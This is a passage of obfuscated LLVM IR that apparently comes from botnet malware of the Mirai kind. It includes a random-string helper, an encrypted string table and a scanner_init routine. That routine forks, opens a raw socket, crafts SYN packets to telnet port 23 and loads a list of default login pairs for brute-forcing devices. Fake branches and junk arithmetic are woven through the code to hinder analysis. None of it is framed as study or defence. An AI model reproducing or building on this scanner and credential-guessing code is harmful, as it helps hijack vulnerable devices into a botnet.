  %149 = sub nsw i32 %148, 2
  store i32 %149, i32* %8, align 4
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %113
  %150 = load i32, i32* %12, align 4
  %_9 = sub i32 0, %150
  %gen10 = add i32 %_9, 65535
  %_11 = shl i32 %150, 65535
  %_12 = sub i32 0, %150
  %gen13 = add i32 %_12, 65535
  %_14 = shl i32 %150, 65535
  %_15 = sub i32 %150, 65535
  %gen16 = mul i32 %_15, 65535
  %_17 = shl i32 %150, 65535
  %151 = and i32 %150, 65535
  %152 = load i32, i32* %12, align 4
  %_18 = sub i32 0, %152
  %gen19 = add i32 %_18, 16
  %_20 = shl i32 %152, 16
  %_21 = sub i32 0, %152
  %gen22 = add i32 %_21, 16
  %153 = lshr i32 %152, 16
  %_23 = sub i32 %151, %153
  %gen24 = mul i32 %_23, %153
  %_25 = shl i32 %151, %153
  %154 = add i32 %151, %153
  store i32 %154, i32* %12, align 4
  br label %originalBB8
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = load i32, i32* @x.49
  %4 = load i32, i32* @y.50
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i32, i32* @x.49
  %14 = load i32, i32* @y.50
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %21

; <label>:21:                                     ; preds = %125, %originalBBpart2
  %22 = load i32, i32* @x.49
  %23 = load i32, i32* @y.50
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %21
  %30 = load i32, i32* %12, align 4
  %31 = icmp sgt i32 %30, 0
  %32 = load i32, i32* @x.49
  %33 = load i32, i32* @y.50
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %31, label %40, label %126

; <label>:40:                                     ; preds = %originalBBpart24
  %41 = load i32, i32* @x.49
  %42 = load i32, i32* @y.50
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %40
  %49 = load i32, i32* %12, align 4
  %50 = icmp sge i32 %49, 4
  %51 = load i32, i32* @x.49
  %52 = load i32, i32* @y.50
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %50, label %59, label %69

; <label>:59:                                     ; preds = %originalBBpart28
  %60 = call i32 @rand_next()
  %61 = load i8*, i8** %11, align 8
  %62 = bitcast i8* %61 to i32*
  store i32 %60, i32* %62, align 4
  %63 = load i8*, i8** %11, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 4
  store i8* %64, i8** %11, align 8
  %65 = load i32, i32* %12, align 4
  %66 = sext i32 %65 to i64
  %67 = sub i64 %66, 4
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %12, align 4
  br label %125

; <label>:69:                                     ; preds = %originalBBpart28
  %70 = load i32, i32* %12, align 4
  %71 = icmp sge i32 %70, 2
  br i1 %71, label %72, label %100

; <label>:72:                                     ; preds = %69
  %73 = load i32, i32* @x.49
  %74 = load i32, i32* @y.50
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %72
  %81 = call i32 @rand_next()
  %82 = and i32 %81, 65535
  %83 = trunc i32 %82 to i16
  %84 = load i8*, i8** %11, align 8
  %85 = bitcast i8* %84 to i16*
  store i16 %83, i16* %85, align 2
  %86 = load i8*, i8** %11, align 8
  %87 = getelementptr inbounds i8, i8* %86, i64 2
  store i8* %87, i8** %11, align 8
  %88 = load i32, i32* %12, align 4
  %89 = sext i32 %88 to i64
  %90 = sub i64 %89, 2
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %12, align 4
  %92 = load i32, i32* @x.49
  %93 = load i32, i32* @y.50
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart227, label %originalBB10alteredBB

originalBBpart227:                                ; preds = %originalBB10
  br label %124

; <label>:100:                                    ; preds = %69
  %101 = load i32, i32* @x.49
  %102 = load i32, i32* @y.50
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %100
  %109 = call i32 @rand_next()
  %110 = and i32 %109, 255
  %111 = trunc i32 %110 to i8
  %112 = load i8*, i8** %11, align 8
  %113 = getelementptr inbounds i8, i8* %112, i32 1
  store i8* %113, i8** %11, align 8
  store i8 %111, i8* %112, align 1
  %114 = load i32, i32* %12, align 4
  %115 = add nsw i32 %114, -1
  store i32 %115, i32* %12, align 4
  %116 = load i32, i32* @x.49
  %117 = load i32, i32* @y.50
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart243, label %originalBB29alteredBB

originalBBpart243:                                ; preds = %originalBB29
  br label %124

; <label>:124:                                    ; preds = %originalBBpart243, %originalBBpart227
  br label %125

; <label>:125:                                    ; preds = %124, %59
  br label %21

; <label>:126:                                    ; preds = %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %127 = alloca i8*, align 8
  %128 = alloca i32, align 4
  store i8* %0, i8** %127, align 8
  store i32 %1, i32* %128, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %21
  %129 = load i32, i32* %12, align 4
  %130 = icmp sgt i32 %129, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %40
  %131 = load i32, i32* %12, align 4
  %132 = icmp sge i32 %131, 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %72
  %133 = call i32 @rand_next()
  %_ = sub i32 0, %133
  %gen = add i32 %_, 65535
  %_11 = sub i32 %133, 65535
  %gen12 = mul i32 %_11, 65535
  %_13 = shl i32 %133, 65535
  %_14 = shl i32 %133, 65535
  %134 = and i32 %133, 65535
  %135 = trunc i32 %134 to i16
  %136 = load i8*, i8** %11, align 8
  %137 = bitcast i8* %136 to i16*
  store i16 %135, i16* %137, align 2
  %138 = load i8*, i8** %11, align 8
  %139 = getelementptr inbounds i8, i8* %138, i64 2
  store i8* %139, i8** %11, align 8
  %140 = load i32, i32* %12, align 4
  %141 = sext i32 %140 to i64
  %_15 = sub i64 %141, 2
  %gen16 = mul i64 %_15, 2
  %_17 = sub i64 0, %141
  %gen18 = add i64 %_17, 2
  %_19 = sub i64 %141, 2
  %gen20 = mul i64 %_19, 2
  %_21 = sub i64 %141, 2
  %gen22 = mul i64 %_21, 2
  %_23 = sub i64 %141, 2
  %gen24 = mul i64 %_23, 2
  %_25 = shl i64 %141, 2
  %142 = sub i64 %141, 2
  %143 = trunc i64 %142 to i32
  store i32 %143, i32* %12, align 4
  br label %originalBB10

originalBB29alteredBB:                            ; preds = %originalBB29, %100
  %144 = call i32 @rand_next()
  %_30 = sub i32 0, %144
  %gen31 = add i32 %_30, 255
  %_32 = sub i32 0, %144
  %gen33 = add i32 %_32, 255
  %_34 = shl i32 %144, 255
  %_35 = sub i32 0, %144
  %gen36 = add i32 %_35, 255
  %_37 = shl i32 %144, 255
  %145 = and i32 %144, 255
  %146 = trunc i32 %145 to i8
  %147 = load i8*, i8** %11, align 8
  %148 = getelementptr inbounds i8, i8* %147, i32 1
  store i8* %148, i8** %11, align 8
  store i8 %146, i8* %147, align 1
  %149 = load i32, i32* %12, align 4
  %_38 = sub i32 %149, -1
  %gen39 = mul i32 %_38, -1
  %_40 = sub i32 %149, -1
  %gen41 = mul i32 %_40, -1
  %150 = add nsw i32 %149, -1
  store i32 %150, i32* %12, align 4
  br label %originalBB29
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = load i32, i32* @x.51
  %4 = load i32, i32* @y.52
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca [32 x i8], align 16
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %14 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %15 = call i8* @table_retrieve_val(i32 28, i32* null)
  %16 = call i8* @strcpy(i8* %14, i8* %15) #6
  %17 = load i32, i32* @x.51
  %18 = load i32, i32* @y.52
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %29, %originalBBpart2
  %26 = load i32, i32* %12, align 4
  %27 = add nsw i32 %26, -1
  store i32 %27, i32* %12, align 4
  %28 = icmp ne i32 %26, 0
  br i1 %28, label %29, label %39

; <label>:29:                                     ; preds = %25
  %30 = call i32 @rand_next()
  %31 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %32 = call i32 @util_strlen(i8* %31)
  %33 = urem i32 %30, %32
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = load i8*, i8** %11, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %11, align 8
  store i8 %36, i8* %37, align 1
  br label %25

; <label>:39:                                     ; preds = %25
  call void @table_lock_val(i8 zeroext 28)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca [32 x i8], align 16
  store i8* %0, i8** %40, align 8
  store i32 %1, i32* %41, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %43 = getelementptr inbounds [32 x i8], [32 x i8]* %42, i32 0, i32 0
  %44 = call i8* @table_retrieve_val(i32 28, i32* null)
  %45 = call i8* @strcpy(i8* %43, i8* %44) #6
  br label %originalBB
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.30, align 8
  %6 = alloca %struct.fd_set.30, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.31, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #6
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %52, label %49

; <label>:49:                                     ; preds = %0
  %50 = load i32, i32* @scanner_pid, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %49, %0
  ret void

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* @x.53
  %55 = load i32, i32* @y.54
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %53
  %62 = call i32 @util_local_addr()
  store i32 %62, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %63 = call i64 @time(i64* null) #6
  %64 = trunc i64 %63 to i32
  store i32 %64, i32* @fake_time, align 4
  %65 = call noalias i8* @calloc(i64 256, i64 296) #6
  %66 = bitcast i8* %65 to %struct.scanner_connection*
  store %struct.scanner_connection* %66, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  %67 = load i32, i32* @x.53
  %68 = load i32, i32* @y.54
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %75

; <label>:75:                                     ; preds = %89, %originalBBpart2
  %76 = load i32, i32* %1, align 4
  %77 = icmp slt i32 %76, 256
  br i1 %77, label %78, label %92

; <label>:78:                                     ; preds = %75
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %80 = load i32, i32* %1, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i64 %81
  %83 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %82, i32 0, i32 3
  store i32 0, i32* %83, align 8
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %85 = load i32, i32* %1, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i64 %86
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 1
  store i32 -1, i32* %88, align 8
  br label %89

; <label>:89:                                     ; preds = %78
  %90 = load i32, i32* %1, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %1, align 4
  br label %75

; <label>:92:                                     ; preds = %75
  %93 = load i32, i32* @x.53
  %94 = load i32, i32* @y.54
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %92
  %101 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %101, i32* @rsck, align 4
  %102 = icmp eq i32 %101, -1
  %103 = load i32, i32* @x.53
  %104 = load i32, i32* @y.54
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %102, label %111, label %128

; <label>:111:                                    ; preds = %originalBBpart24
  %112 = load i32, i32* @x.53
  %113 = load i32, i32* @y.54
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %111
  call void @exit(i32 0) #8
  %120 = load i32, i32* @x.53
  %121 = load i32, i32* @y.54
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  unreachable

; <label>:128:                                    ; preds = %originalBBpart24
  %129 = load i32, i32* @rsck, align 4
  %130 = load i32, i32* @rsck, align 4
  %131 = call i32 (i32, i32, ...) @fcntl(i32 %130, i32 3, i32 0)
  %132 = or i32 2048, %131
  %133 = call i32 (i32, i32, ...) @fcntl(i32 %129, i32 4, i32 %132)
  store i32 1, i32* %1, align 4
  %134 = load i32, i32* @rsck, align 4
  %135 = bitcast i32* %1 to i8*
  %136 = call i32 @setsockopt(i32 %134, i32 0, i32 3, i8* %135, i32 4) #6
  %137 = icmp ne i32 %136, 0
  br i1 %137, label %138, label %157

; <label>:138:                                    ; preds = %128
  %139 = load i32, i32* @x.53
  %140 = load i32, i32* @y.54
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %138
  %147 = load i32, i32* @rsck, align 4
  %148 = call i32 @close(i32 %147)
  call void @exit(i32 0) #8
  %149 = load i32, i32* @x.53
  %150 = load i32, i32* @y.54
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

; <label>:157:                                    ; preds = %128
  br label %158

; <label>:158:                                    ; preds = %162, %157
  %159 = call i32 @rand_next()
  %160 = and i32 %159, 65535
  %161 = trunc i32 %160 to i16
  store i16 %161, i16* %2, align 2
  br label %162

; <label>:162:                                    ; preds = %158
  %163 = load i16, i16* %2, align 2
  %164 = call zeroext i16 @ntohs(i16 zeroext %163) #7
  %165 = zext i16 %164 to i32
  %166 = icmp slt i32 %165, 1024
  br i1 %166, label %158, label %167

; <label>:167:                                    ; preds = %162
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %168 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i64 1
  %170 = bitcast %struct.iphdr* %169 to %struct.tcphdr*
  store %struct.tcphdr* %170, %struct.tcphdr** %4, align 8
  %171 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %172 = bitcast %struct.iphdr* %171 to i8*
  %173 = load i8, i8* %172, align 4
  %174 = and i8 %173, -16
  %175 = or i8 %174, 5
  store i8 %175, i8* %172, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = load i8, i8* %177, align 4
  %179 = and i8 %178, 15
  %180 = or i8 %179, 64
  store i8 %180, i8* %177, align 4
  %181 = call zeroext i16 @htons(i16 zeroext 40) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 2
  store i16 %181, i16* %183, align 2
  %184 = call i32 @rand_next()
  %185 = trunc i32 %184 to i16
  %186 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 3
  store i16 %185, i16* %187, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 5
  store i8 64, i8* %189, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 6
  store i8 6, i8* %191, align 1
  %192 = call zeroext i16 @htons(i16 zeroext 23) #7
  %193 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %194 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %193, i32 0, i32 1
  store i16 %192, i16* %194, align 2
  %195 = load i16, i16* %2, align 2
  %196 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 4
  %198 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -241
  %202 = or i16 %201, 80
  store i16 %202, i16* %199, align 4
  %203 = call i32 @rand_next()
  %204 = and i32 %203, 65535
  %205 = trunc i32 %204 to i16
  %206 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 5
  store i16 %205, i16* %207, align 2
  %208 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %210, -513
  %212 = or i16 %211, 512
  store i16 %212, i16* %209, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.14, i32 0, i32 0), i16 zeroext 15)
  br label %213

; <label>:213:                                    ; preds = %1699, %167
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %214 = load i32, i32* @fake_time, align 4
  %215 = load i32, i32* %10, align 4
  %216 = icmp ne i32 %214, %215
  br i1 %216, label %217, label %354

; <label>:217:                                    ; preds = %213
  %218 = load i32, i32* @x.53
  %219 = load i32, i32* @y.54
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %217
  %226 = load i32, i32* @fake_time, align 4
  store i32 %226, i32* %10, align 4
  store i32 0, i32* %1, align 4
  %227 = load i32, i32* @x.53
  %228 = load i32, i32* @y.54
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %235

; <label>:235:                                    ; preds = %originalBBpart231, %originalBBpart216
  %236 = load i32, i32* @x.53
  %237 = load i32, i32* @y.54
